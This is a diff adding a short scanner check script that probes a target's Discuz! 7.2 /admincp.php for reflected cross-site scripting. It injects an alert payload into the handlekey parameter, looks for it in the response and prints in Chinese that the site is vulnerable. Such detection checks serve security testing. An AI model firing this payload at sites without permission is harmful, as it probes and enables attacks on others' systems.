@@ -1,0 +1,11 @@
+#request url = var
+
+
+function main(args)
+{
+	res = HttpGet(url."/admincp.php?infloat=yes&handlekey=123);alert(/bb2/);//","User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+	if(StrFindStr(res[0],"return_123);alert(/bb2/);//",0)!= "-1")
+	{
+		print(url."/admincp.php?infloat=yes&handlekey=123);alert(/bb2/);// 目标存在Discuz! 7.2 /admincp.php |跨站脚本漏洞");
+	}
+}
